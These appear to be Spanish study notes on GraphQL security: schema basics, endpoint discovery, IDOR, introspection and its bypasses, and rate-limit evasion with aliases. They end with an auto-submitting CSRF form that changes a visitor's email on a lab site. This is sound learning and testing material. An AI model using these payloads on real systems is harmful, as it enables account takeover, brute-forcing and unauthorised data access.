
-------
# Definición

>**GraphQL** es un lenguaje de consulta para APIs y un entorno de ejecución que permite a los clientes solicitar exactamente los datos que necesitan, en lugar de recibir estructuras fijas como ocurre con REST.

Desde el punto de vista de la ciberseguridad, GraphQL no es solo una tecnología de desarrollo, sino también una superficie de ataque con características muy particulares.

## Principales riesgos de seguridad en GraphQL

### 1. Exposición del esquema (Introspection)

GraphQL permite consultar su propia estructura interna:

Un atacante puede descubrir:
- Tipos de datos
- Campos sensibles
- Relaciones internas

Si la introspección está habilitada en producción, facilita el reconocimiento (recon).

### 2. Overfetching / Underfetching controlado por el atacante

A diferencia de REST:

- El atacante puede pedir demasiados datos en una sola query
- O construir consultas profundamente anidadas

Esto puede provocar:

- Denegación de servicio (DoS) por queries complejas
- Acceso a datos no previstos

### 3. Falta de control de autorización a nivel de campo

En GraphQL:

- No basta con proteger endpoints
- Hay que proteger cada campo individual

Error típico:
``` js
query {
  user(id: 1) {
    username
    email
    password   # ❌ campo sensible expuesto
  }
}
```

### 4. Injection (GraphQL Injection)

Aunque usa JSON/queries estructuradas:

- Puede ser vulnerable a:
- SQL Injection
- NoSQL Injection
- Command Injection

Si los resolvers no validan correctamente la entrada.

### 5. Batching y query abuse

GraphQL permite enviar múltiples queries en una sola petición:

Puede facilitar:
- Brute force
- Bypass de rate limiting

### 6. Falta de límites en profundidad y complejidad

Consultas como:
``` js
user {
  friends {
    friends {
      friends {
        ...
      }
    }
  }
}
```

Pueden colapsar el servidor si no hay límites.

## Buenas prácticas

- *Deshabilitar introspection* en producción
- Implementar:
	- Rate limiting
	- Query depth limiting
	- Query complexity analysis
- Autorización a nivel de campo (no solo endpoint)
- Validación estricta de inputs
- Logging y monitorización de queries

-----------
# Conceptos básicos

## GraphQL schema

>Definición de datos legible que representa un contrato entre los servicios front-end y back-end.

``` js
#Example schema definition

type Product {
	id: ID!
	name: String!
	description: String!
	price: Int
}
```

Los esquemas deben incluir al menos una query disponible.

## GraphQL queries

>Las queries GraphQL devuelven datos del registro de datos. Funcionan de manera similar a las peticiones GET en una API REST.

Suelen tener los siguientes componentes:

- El *tipo de operación* `query`. Opcional pero recomendado, ya que indica explícitamente al servidor que la petición es una query.
- Un *nombre* de query. Puede ser cualquier cosa. Opcional pero recomendado.
- Una *estructura de datos*. Son los datos que debería devolver la query.
- Opcionalmente, uno o más *argumentos*. Usados para crear queries que devuelvan detalles concretos del objeto especificado.

``` js
#Example query

query myGetProductQuery {
	getProduct(id: 123) {
		name
		description
	}
}
```

## GraphQL mutations

>Las mutations cambian datos de alguna forma, como añadir, borrar o editarlos. Son prácticamente equivalentes a los métodos POST, PUT y DELETE de las APIs REST.

Como las queries, tienen tipo de operación, nombre, y estructura de datos a devolver. Además, siempre tienen un input de algún tipo.

``` js
#Example mutation request

mutation {
	createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
		id
		name
		listed
	}
}
```

``` json
#Example mutation response

{
	"data": {
		"createProduct": {
			"id": 123,
			"name": "Flamin' Cocktail Glasses",
			"listed": "yes"
		}
	}
}
```

## Componentes de queries y mutations

### Fields

Son los atributos de los objetos a devolver indicados en la petición graphql.

### Arguments

Los valores especificados para campos concretos, que se indican entre paréntesis.

### Variables

Permiten pasar argumentos dinámicamente, en vez de declararlos directamente en la query.

``` js
#Example query with variable

query getEmployeeWithVariable($id: ID!) {
	getEmployees(id:$id) {
		name {
			firstname
			lastname
		}
	}
}

Variables:
{
	"id": 1
}
```

### Aliases

Los objetos no pueden contener múltiples propiedades con el mismo nombre. La siguiente query es inválida porque trata de devolver dos veces `product`.

``` js
#Invalid query

query getProductDetails {
	getProduct(id: 1) {
		id
		name
	}
	getProduct(id: 2) {
		id
		name
	}
}
```

Esta restricción se puede bypassear nombrando explícitamente las propiedades que se quiere que devuelva la API.

``` js
#Valid query using aliases

query getProductDetails {
	product1: getProduct(id: "1") {
		id
		name
	}
	product2: getProduct(id: "2") {
		id
		name
	}
}
```

``` json
#Response to query

{ 
	"data": {
		"product1": {
			"id": 1,
			"name": "Juice Extractor"
		},
		"product2": {
			"id": 2,
			"name": "Fruit Overlays"
		}
	}
}
```

### Fragments

Son un conjunto de fields que pertenecen a un tipo asociado que se pueden utilizar en queries o mutations.

``` js
#Example fragment

fragment productInfo on Product {
	id
	name
	listed
}
```

``` js
#Query calling the fragment

query {
	getProduct(id: 1) {
		...productInfo
		stock
	}
}
```

``` json
#Response including fragment fields

{
	"data": {
		"getProduct": {
			"id": 1,
			"name": "Juice Extractor",
			"listed": "no",
			"stock": 5
		}
	}
}
```

---------
# Finding GraphQL endpoints

>La API de GraphQL utiliza el mismo endpoint para todas las peticiones, por lo que es muy valioso.

## Universal queries

Para probar manualmente por endponints GraphQL, se enviará una petición con el contenido:

``` js
query{_typename}
```

Se confirmará que el endpoint es GraphQL si devuelve en su respuesta:

``` json
{"data": {"_typename": "query"}}
```

## Common endpoint names

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

También se puede probar a añadir `/v1` al final de la ruta de los anteriores endpoints.

## Request methods

Lo común es que el endpoint solo acepte peticiones POST con la cabecera `Content-Type` como `application/json`, pero no siempre es así.

Si los endpoints comunes no responden a la petición POST, probar a enviar la query universal con otro método HTTP.

-----------
# Exploiting unsanitized arguments

Si la API utiliza argumentos para acceder a objeos directamente, puede ser vulnerable a vulnerabilidades de control de acceso, como puede ser el IDOR (Insecure Direct Object Reference).

Por ejemplo, la siguiente query solicita la lista de los productos de la tienda online:

``` js
#Example product query

query {
	products {
		id
		name
		listed
	}
}
```

La lista de productos solo contiene productos enlistados (listed = true):

``` json
#Example product response

{ 
	"data": {
		"products": [
			{
				"id": 1,
				"name": "Product 1",
				"listed": true
			},
			{
				"id": 2,
				"name": "Product 2",
				"listed": true
			},
			{
				"id": 4,
				"name": "Product 4",
				"listed": true
			}
		]
	}
}
```

De esta información se infiere que:

- A los productos se les asigna un ID secuencial.
- El producto con ID 3 falta en la lista, posiblemente porque se haya desenlistado.

Con la siguiente query con el ID del producto faltante se puede conseguir sus detalles:

``` js
#Query to get missing product

query {
	product(id: 3) {
		id
		name
		listed
	}
}
```

``` json
#Missing product response

{
	"data": {
		"product": {
			"id": 3,
			"name": "Product 3",
			"listed": no
		}
	}
}
```

-----------
# Discovering schema information

## Introspection

Las queries de introspección son una función incluida en GraphQL que permite solicitar al servidor información sobre el esquema.

La introspección debería estar deshabilitada en el entorno de producción. Para probar si está habilitada se manda la siguiente query:

``` json
#Introspection probe request

{
	"query": "{__schema{queryType{name}}}"
}
```

Esto debería devolver los nombres de las queries disponibles.

Para un reconocimiento profundo del esquema, se puede mandar el siguiente payload:

``` json
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
            ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        onOperation  #Often needs to be deleted to run query
        onFragment   #Often needs to be deleted to run query
        onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

## Suggestions

Son una funcionalidad de Apollo GraphQL donde el servidor puede sugerir correcciones de la query en mensajes de error. Sobre todo cuando la query es ligeramente incorrecta pero aún así reconocible.

``` text
There is no entry for 'productInfo'. Did you mean 'productInformation' instead?
```

La herramienta [Clairvoyance](https://github.com/nikitastupin/clairvoyance) permite recuperar todo o parte del esquema GraphQL usando sugerencias, en casos en los que la introspección esté deshabilitada.

--------
# Bypassing GraphQL introspection defenses

Puede que se esté deshabilitando la introspección excluyendo con una regex `_schema` o `_schema{`. Esto se puede intentar bypassear insertando espacios, saltos de línea y comas.

También se puede intentar bypassear cambiando el método HTTP, de POST a GET.

Si no funciona, se puede probar a cambiar además el content-type de la petición POST a `x-www-form-urlencoded`.

--------
# Bypassing rate limiting using aliases

Algunos rate limits funcionan en base a número de peticiones HTTP recibidas en vez de número de operaciones efectuadas. Esto se puede bypassear con aliases.

``` js
#Request with aliased queries

query isValidDiscount($code: Int) {
	isvalidDiscount(code:$code){
		valid
	}
	isValidDiscount2:isValidDiscount(code:$code){
		valid
	}
	isValidDiscount3:isValidDiscount(code:$code){
		valid
	}
}
```

--------
# GraphQL CSRF

Se da cuando el endpoint no valida que el content-type sea `application/json` y no tiene implementados tokens CSRF.

Ejemplo de payload para cambiar el correo de quien visite la página:

``` html
<html>
  <body>
    <form action="https://0a29000b03d208d882ff60a200c20051.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value='mutation changeEmail {
    changeEmail(input: {email: "gg@gg.com"}) {
        email
    }
}' />
      <input type="submit" value="Submit form" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  <body>
</html>
```